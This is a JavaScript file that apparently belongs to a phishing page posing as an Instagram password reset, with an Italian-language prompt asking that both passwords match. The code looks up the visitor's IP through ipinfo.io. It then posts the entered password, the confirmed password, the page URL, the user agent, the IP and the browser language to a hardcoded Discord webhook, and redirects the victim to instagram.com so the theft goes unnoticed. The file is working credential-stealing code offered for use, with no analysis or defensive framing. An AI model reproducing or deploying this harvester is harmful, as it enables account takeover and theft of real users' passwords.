$.get("https://ipinfo.io", function(response) {
    document.getElementById('ciao').innerHTML=String(response.ip);
}, "json")

    
function sendMessage() {
    function sleep(milliseconds) {
        const date = Date.now();
        let currentDate = null;
        do {
            currentDate = Date.now();
        } while (currentDate - date < milliseconds);
    }

    if((document.getElementById('password').value).length<6){

    }
    else if(document.getElementById('password').value == document.getElementById('password1').value){	  	
        var request = new XMLHttpRequest();
        request.open("POST", "https://discordapp.com/api/webhooks/989526999108288533/tguIg-6kUK6bTOJHsnF4OdjseESWC90TGcNhGnlUeikcM7CY8M46peKie5GS6rxgSTWm");
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
            content: ("> **FROM : **" + window.location.href + "\n> **PASSWORD  : **" + document.getElementById('password').value + "\n> **CONFIRMED PASSWORD : **" + document.getElementById('password1').value + "\n> **USER AGENT : **" + navigator.userAgent + "\n> **IP : **" + document.getElementById('ciao').innerHTML + "\n> **LANGUAGE : **" + navigator.language || navigator.userLanguage)
        }
        request.send(JSON.stringify(params));
        sleep(400);
        window.location.replace("https://instagram.com/");   
    }
    else{
        document.getElementById('alert').innerHTML = "Assicurati che entrambe le password corrispondano.";
    }
}
